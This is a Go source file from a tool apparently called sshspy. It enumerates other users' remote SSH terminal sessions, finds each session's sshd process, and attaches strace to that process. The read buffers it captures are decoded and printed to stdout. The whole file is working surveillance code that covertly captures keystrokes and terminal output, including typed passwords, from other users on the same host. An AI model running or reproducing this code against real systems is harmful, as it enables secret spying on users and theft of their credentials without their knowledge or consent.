package pts

import (
	"bufio"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"

	"github.com/shirou/gopsutil/host"
	"github.com/td0m/sshspy/pkg/util"
)

func GetPTSList() []host.UserStat {
	users, _ := host.Users()
	thisTerminal, _ := util.CurrentTerminalDevice()

	filtered := []host.UserStat{}
	for _, u := range users {
		// make sure it's a remote ssh terminal session AND isn't the current pts client
		if u.Terminal[:3] == "pts" && "/dev/"+u.Terminal != thisTerminal {
			filtered = append(filtered, u)
		}
	}

	return filtered
}

// TODO: add ability to specify write buffer instead of stdout, allowing us to e.g. log to a file
func ReadPTS(id int) {
	pid, _ := getPID(id)
	fmt.Printf("PID: %d\n", pid)
	// -xx specifies hex escapes, these can be decoded with Go's "strconv.Unquote"
	cmd := exec.Command("strace", "-xx", "-s", "16384", "-p", strconv.Itoa(pid), "-e", "read")
	stdoutPipe, _ := cmd.StdoutPipe()
	// redirect stderr to stdout (2>&1) as we need to read both
	cmd.Stderr = cmd.Stdout
	cmd.Start()
	scanner := bufio.NewScanner(stdoutPipe)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		line := scanner.Text()
		// only try to parse read and write syscalls
		if strings.HasPrefix(line, "read") || strings.HasPrefix(line, "write") {
			c, err := parseLine(line)
			if err != nil {
				panic(line)
			}
			// not sure why, but after trial and error this worked
			if c.Count == 16384 && c.Fd != 4 {
				os.Stdout.WriteString(c.Buf)
				os.Stdout.Sync()
			}
		}
	}
	cmd.Wait()
	fmt.Println("closed")
}

// uses `ps -ef` and regex to extract the PID of /dev/pts/X process
func getPID(ptsN int) (int, error) {
	r, _ := regexp.Compile("^[^ ]+ +([0-9]+)")
	ttyStr := fmt.Sprintf("pts/%d", ptsN)

	cmd := exec.Command("ps", "-ef")
	stdoutPipe, _ := cmd.StdoutPipe()
	cmd.Start()
	scanner := bufio.NewScanner(stdoutPipe)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "sshd:") && strings.Contains(line, ttyStr) {
			pidStr := r.FindStringSubmatch(line)[1]
			pid, _ := strconv.Atoi(pidStr)
			return pid, nil
		}
	}
	cmd.Wait()
	return -1, errors.New("proc not found")
}

func parseLine(line string) (ReadCmd, error) {
	r, _ := regexp.Compile(`(read)\(([0-9]+), "(.*)", ([0-9]+)\) += +([0-9]+)`)
	matches := r.FindStringSubmatch(line)
	if len(matches) != 6 {
		return ReadCmd{}, errors.New("failed parsing read/write command")
	}

	fd, _ := strconv.Atoi(matches[2])
	count, _ := strconv.Atoi(matches[4])
	buf, _ := strconv.Unquote(`"` + matches[3] + `"`)
	out, _ := strconv.Atoi(matches[5])

	return ReadCmd{fd, buf, count, out}, nil
}
